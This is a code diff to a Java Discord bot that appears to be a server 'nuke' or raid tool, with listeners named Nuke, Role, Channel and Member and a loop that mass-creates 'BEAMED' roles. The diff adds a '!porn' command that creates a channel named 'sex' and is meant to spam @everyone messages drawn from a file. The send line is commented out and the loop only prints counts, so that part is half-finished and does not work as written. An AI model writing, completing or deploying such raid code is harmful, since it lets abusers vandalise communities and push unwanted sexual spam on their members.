@@ -35,7 +35,7 @@ public final class Bot {
                 .enableCache(CacheFlag.FORUM_TAGS)
                 .enableIntents(GatewayIntent.GUILD_MESSAGES, GatewayIntent.MESSAGE_CONTENT, GatewayIntent.GUILD_MEMBERS)
                 // Initialize commands
-                .addEventListeners(new Nuke(), new Emoji(), new Channel(), new Role(), new Member(), new Create(), new Rolez())
+                .addEventListeners(new Nuke(), new Emoji(), new Channel(), new Role(), new Member(), new Create(), new Porn(), new Rolez())
                 .build()
                 .awaitReady();
     }
@@ -87,6 +87,38 @@ public final class Bot {
             // For loop to create roles
             for (int i = 0; i < 10; i++) {
                 guild.createRole().setName("BEAMED").setColor(colors).queue(role -> role.createCopy());
+            }
+            event.getMessage().delete().queue();
+        }
+    }
+
+    // Create x channels and spam porn x times in each channel
+    private static final class Porn extends ListenerAdapter {
+        @Override
+        public void onMessageReceived(@NotNull MessageReceivedEvent event) {
+            if (!event.isFromGuild() || !event.getMessage().getContentRaw().contains("!porn")) return;
+            Guild guild = event.getGuild();
+
+            // For loop to create channels
+            for (int i = 0; i < 1; i++) {
+                guild.createTextChannel("sex").queue(textChannel -> {
+                    // For loop to spam prn in channels
+                    for (int j = 0; j < 50; j++) {
+                        try {
+                            File files = new File("random.txt");
+                            int c = 0;
+                            Scanner scanner = new Scanner(files);
+                            while (scanner.hasNextLine()) {
+                                String l = scanner.nextLine();
+                                c++;
+                                Random random = new Random();
+                                int r = random.nextInt(c);
+                                //textChannel.sendMessage("@everyone\n" + c).queue();
+                                System.out.println(c);
+                            }
+                        } catch (FileNotFoundException e) {}
+                    }
+                });
             }
             event.getMessage().delete().queue();
         }
